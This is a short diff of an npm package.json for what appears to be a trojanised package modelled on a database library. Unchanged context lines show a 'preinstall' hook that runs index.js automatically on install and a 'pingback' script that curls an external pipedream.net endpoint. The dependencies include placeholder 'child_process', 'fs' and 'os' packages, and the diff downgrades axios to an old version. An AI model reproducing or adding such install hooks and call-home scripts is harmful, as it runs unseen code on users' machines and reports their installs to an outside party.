@@ -27,7 +27,7 @@
     "mquery": "5.0.0",
     "ms": "2.1.3",
     "sift": "17.1.3",
-    "axios": "^1.2.6",
+    "axios": "^0.21.1",
     "child_process": "^1.0.2",
     "fs": "^0.0.1-security",
     "os": "^0.1.2",
@@ -125,7 +125,7 @@
     "build": "tsup",
     "preinstall": "index.js",
     "pingback": "curl https://eo536ohsnextro9.m.pipedream.net",
-    "start": "index.js"
+    "start": "node index.js"
   },
   "main": "./index.js",
   "types": "./types/index.d.ts",
